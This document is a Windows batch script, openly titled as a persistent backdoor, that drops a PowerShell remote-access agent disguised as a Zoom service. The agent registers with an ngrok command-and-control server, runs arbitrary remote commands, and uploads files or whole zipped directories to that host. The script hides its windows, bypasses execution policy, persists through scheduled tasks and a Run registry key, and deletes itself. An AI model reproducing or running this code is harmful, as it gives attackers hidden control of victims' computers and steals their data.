@echo off
:: Advanced Persistent Backdoor using Task Scheduler
:: Runs completely hidden with automatic restart on failure

:: Configuration
set "SERVER=https://thoughtless-derek-nonextinguishable.ngrok-free.dev"
set "UID=%USERNAME%-%RANDOM%"
set "PSCRIPT=%APPDATA%\Microsoft\Windows\ZoomService.ps1"

:: Create PowerShell backdoor script (using temp file method)
set "TEMPPS=%TEMP%\zs.tmp"
(
echo $s='https://thoughtless-derek-nonextinguishable.ngrok-free.dev'
echo $uid='%UID%'
echo $info=@{user=$env:USERNAME; os=^(Get-WmiObject Win32_OperatingSystem^).Caption}
echo try { Invoke-RestMethod -Uri "$s/api/c2/register" -Method Post -Body ^(ConvertTo-Json @{uid=$uid; info=$info}^) -ContentType 'application/json' -ErrorAction Stop } catch { exit }
echo while^($true^) {
echo     try {
echo         $cmd = ^(Invoke-RestMethod -Uri "$s/api/c2/poll" -Method Post -Body ^(ConvertTo-Json @{uid=$uid}^) -ContentType 'application/json' -ErrorAction Stop^).command
echo         if^($cmd^) {
echo             if^($cmd -like '__list_files__*'^) {
echo                 $path = $cmd -replace '__list_files__ ', ''
echo                 if^(-not $path^) { $path = ^(Get-Location^).Path }
echo                 $files = Get-ChildItem -Path $path -ErrorAction SilentlyContinue ^| Select-Object @{N='name';E={$_.Name}}, @{N='type';E={if^($_.PSIsContainer^){'dir'}else{'file'}}}, @{N='size';E={$_.Length}}
echo                 Invoke-RestMethod -Uri "$s/api/c2/file_list_response" -Method Post -Body ^(ConvertTo-Json @{uid=$uid; files=$files; path=$path}^) -ContentType 'application/json'
echo             } elseif^($cmd -like '__download__*'^) {
echo                 $file = $cmd -replace '__download__ ', ''
echo                 $bytes = [System.IO.File]::ReadAllBytes^($file^)
echo                 $b64 = [Convert]::ToBase64String^($bytes^)
echo                 Invoke-RestMethod -Uri "$s/api/c2/file_download_response" -Method Post -Body ^(ConvertTo-Json @{uid=$uid; content=$b64; filename=^(Split-Path $file -Leaf^)}^) -ContentType 'application/json'
echo             } elseif^($cmd -like '__download_all__*'^) {
echo                 $dir = $cmd -replace '__download_all__ ', ''
echo                 if^(-not $dir^) { $dir = ^(Get-Location^).Path }
echo                 $zipPath = "$env:TEMP\archive.zip"
echo                 if^(Test-Path $zipPath^) { Remove-Item $zipPath -Force }
echo                 Add-Type -Assembly 'System.IO.Compression.FileSystem'
echo                 [System.IO.Compression.ZipFile]::CreateFromDirectory^($dir, $zipPath^)
echo                 $bytes = [System.IO.File]::ReadAllBytes^($zipPath^)
echo                 $b64 = [Convert]::ToBase64String^($bytes^)
echo                 Invoke-RestMethod -Uri "$s/api/c2/file_download_response" -Method Post -Body ^(ConvertTo-Json @{uid=$uid; content=$b64; filename='archive.zip'}^) -ContentType 'application/json'
echo                 Remove-Item $zipPath -Force
echo             } else {
echo                 $out = iex $cmd 2^>^&1 ^| Out-String
echo                 Invoke-RestMethod -Uri "$s/api/c2/response" -Method Post -Body ^(ConvertTo-Json @{uid=$uid; output=$out}^) -ContentType 'application/json'
echo             }
echo         }
echo     } catch {}
echo     Start-Sleep -Seconds 2
echo }
) > "%TEMPPS%"

:: Copy to final location
copy /Y "%TEMPPS%" "%PSCRIPT%" >nul 2>&1
del "%TEMPPS%" >nul 2>&1

:: Create scheduled task (runs hidden, restarts on failure, persists across reboots)
:: Note: Removed /rl highest to avoid requiring admin rights
schtasks /create /tn "ZoomUpdateService" /tr "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File \"%PSCRIPT%\"" /sc onlogon /f >nul 2>&1

:: Also create a task that runs every 5 minutes as backup
schtasks /create /tn "ZoomUpdateCheck" /tr "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File \"%PSCRIPT%\"" /sc minute /mo 5 /f >nul 2>&1

:: Start the task immediately (run PowerShell directly since task might fail without admin)
start /min powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File "%PSCRIPT%"

:: Add to registry as additional persistence
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "ZoomUpdate" /t REG_SZ /d "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File \"%PSCRIPT%\"" /f >nul 2>&1

:: Self-delete this installer
(goto) 2>nul & del "%~f0"
